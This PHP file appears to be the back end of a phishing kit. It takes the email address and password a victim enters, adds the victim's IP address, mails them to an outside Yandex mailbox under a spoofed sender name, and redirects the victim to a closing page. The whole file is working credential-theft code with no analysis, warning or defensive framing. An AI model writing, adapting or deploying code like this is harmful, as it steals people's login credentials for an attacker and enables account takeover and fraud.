<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Email ID *: ".$_POST['username']."\n";
$message .= "Password*: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$login = $_POST['username'];


$recipient = "fundz444@yandex.com";
$sender = 'NE3333@126.com';
$headers .= "From: NE 3<$sender>\n";
$subject = "NE 3";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: end.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }